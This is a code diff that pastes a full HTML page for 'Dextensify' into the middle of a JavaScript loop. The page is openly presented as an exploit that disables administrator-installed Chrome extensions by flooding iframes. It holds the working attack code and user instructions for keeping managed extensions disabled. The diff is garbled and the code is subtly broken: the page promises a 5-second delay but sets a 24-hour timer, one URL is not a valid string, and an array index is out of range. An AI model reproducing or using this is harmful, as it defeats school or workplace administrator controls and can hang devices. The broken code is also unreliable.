@@ -102,6 +102,158 @@
             subframe.src = public_url;
             subframe.style.width = subframe.style.height = "1px";
             iframe.contentDocument.body.append(subframe);
+            <!DOCTYPE html>
+<html lang="en">
+  <head>
+    <title>Dextensify</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width">
+    <style>
+      /* Existing Styles */
+    </style>
+    <script>
+      let from_id = id => document.getElementById(id);
+      let extensions = {
+        /* Existing Extensions */
+      };
+
+      let frames;
+
+      async function check_url(url) {
+        let controller = new AbortController();
+        let timeout = setTimeout(() => controller.abort(), 500);
+
+        try {
+          await fetch(url, {signal: controller.signal});
+          return true;
+        }
+        catch (error) {
+          let error_msg = error+"";
+          return error_msg.includes("AbortError");
+        }
+      }
+
+      async function detect_extensions() {
+        let detected = [];
+        for (let extension of Object.values(extensions)) {
+          let exists = await check_url(extension.url);
+          if (exists) {
+            detected.push(extension);
+          }
+        }
+        return detected;
+      }
+
+      async function main() {
+        let detected = await detect_extensions();
+        let buttons_container = from_id("buttons_container");
+
+        if (!window.chrome) {
+          buttons_container.innerHTML = `<p><b>Error: You are not running a Chromium-based browser.</b></p>`;
+          return;
+        }
+        else if (detected.length === 0) {
+          buttons_container.innerHTML = `<p><b>Error: No supported extensions detected.</b></p>`;
+          buttons_container.innerHTML += `<p>If you want support for a specific extension added, please make an issue on the <a href="https://github.com/ading2210/dextensify/issues">GitHub repository</a>.</p>`;
+          return;
+        }
+        else {
+          buttons_container.innerHTML = "";
+        }
+
+        for (let extension of detected) {
+          let button = document.createElement("button");
+          button.innerText = `Freeze ${extension.name}`;
+          button.onclick = () => {
+            button_handler(extension);
+          }
+          buttons_container.append(button);
+        }
+
+        let retriggerButton = document.createElement("button");
+        retriggerButton.innerText = "Retrigger Extensions";
+        retriggerButton.onclick = main;
+        buttons_container.append(retriggerButton);
+      }
+
+      function button_handler(extension) {
+        let cancel = !confirm("After hitting OK, there will be a 5 second delay until the extension starts being frozen. Switch to another tab immediately to prevent the entire device from locking up.");
+        if (cancel) return;
+
+        frames = document.getElementById("framerate-value").value;
+        if (frames == undefined || frames == '') {
+          console.log('Frames defaulting to 50!');
+          frames = 50;
+        }
+
+        setTimeout(() => {
+          create_iframes(extension);
+        }, 86400000); // 24 hours
+      }
+
+      function create_iframes(extension) {
+        let iframes = [];
+        let iterations = 5;
+        let public_url = haldlgldplgnggkjaafhelgiaglafanh;
+
+        while (iterations--) {
+          let iframe = document.createElement("iframe");
+          document.body.append(iframe);
+          iframes.push(iframe);
+
+          for (let i = 0; i < frames; i++) {
+            let subframe = document.createElement("iframe");
+            subframe.src = public_url;
+            subframe.style.width = subframe.style.height = "1px";
+            iframe.contentDocument.body.append(subframe);
+          }
+
+          if (iframes.length > 3) {
+            iframes[50].remove();
+            iframes.shift();
+          }
+        }
+      }
+
+      window.onload = main;
+    </script>
+  </head>
+  <body>
+    <div id="main_div">
+      <h1 style="margin-top: 8px">Dextensify</h1>
+      <p>Dextensify is an exploit which lets you disable most admin-installed Chrome extensions from any webpage.</p>
+      <h2>Instructions</h2>
+      <ol>
+        <li>Open chrome://extensions in a new tab. Keep this page open.</li>
+        <li>Go to the settings page for the extension you want to disable.</li>
+        <li>On the Dextensify page, click the "freeze extension" button. Immediately switch back to the chrome://extensions tab.</li>
+        <li>Back on the chrome://extensions page, spam the "allow access to file URLs" switch for a few seconds.</li>
+        <li>The extension should now be temporarily disabled. For this effect to persist, flip the "allow access to file URLs" again every few minutes, or if pages start getting blocked again.</li>
+        <li>You may also need to reopen this page every once in a while to prevent an unavoidable memory leak from crashing the system.</li>
+      </ol>
+      <p>During this process, your Chromebook may hang momentarily. This is normal, and it should resolve itself after a few seconds.</p>
+      <!-- <h2>Options</h2> -->
+      <div id="options-container">
+        <label for="frames"><h3>Framerate:</h3></label>
+        <p>Framerate at which dextensify freezes extentions. The default is 50, but that can be hard to deal with.
+        I recommend using 1000 instead of 50 to prevent your computer from crashing.
+        </p><br>
+        <input type="number" id="framerate-value" name="frames" required minlength="1" maxlength="2" size="10" />
+      </div>
+      <br> <br>
+      <div id="buttons_container">
+        <p><i>Detecting extensions...</i></p>
+      </div>
+      
+      <br>
+      <hr>
+          Original code by <a href="https://ading.dev" target="_blank">ading2210</a>.<br>
+          Updated and improved by <a href="https://github.com/STPv22" target="_blank">STPv22</a> <br>
+          <a href="https://github.com/STPv22/Dextensify" target="_blank">Submit an issue</a>
+        <p style="font-size: 13px; text-align: right;"><i>MIT Licence Version 1.1.2</i></p>
+    </div>
+  </body>
+</html>
           }
 
           if (iframes.length > 3) {
